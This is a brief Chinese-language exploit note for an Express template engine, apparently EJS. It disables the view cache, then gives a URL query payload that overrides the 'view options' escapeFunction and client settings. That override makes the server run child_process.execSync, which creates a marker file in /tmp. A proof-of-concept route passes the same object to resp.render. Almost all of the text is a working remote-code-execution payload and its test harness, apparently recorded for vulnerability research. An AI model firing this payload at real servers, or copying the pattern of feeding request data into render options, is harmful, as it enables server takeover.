模板渲染完成之后默认会 cache ，需要在 cache 之前注入代码，这里为了方便，把 cache 关了

```js
app.set('view cache', false);
```

# payload ：

```
?settings[view%20options][escapeFunction]=console.log;this.global.process.mainModule.require(%27child_process%27).execSync("touch /tmp/3.txt");&settings[view%20options][client]=true
```

# poc

```js
o = {
  "settings":{
    "view options":{
      "escapeFunction":'console.log;this.global.process.mainModule.require("child_process").execSync("touch /tmp/pwned");',
      "client":"true"
    }
  }
}

app.get("/test",function (req,resp){
  return resp.render("test",o);
})
```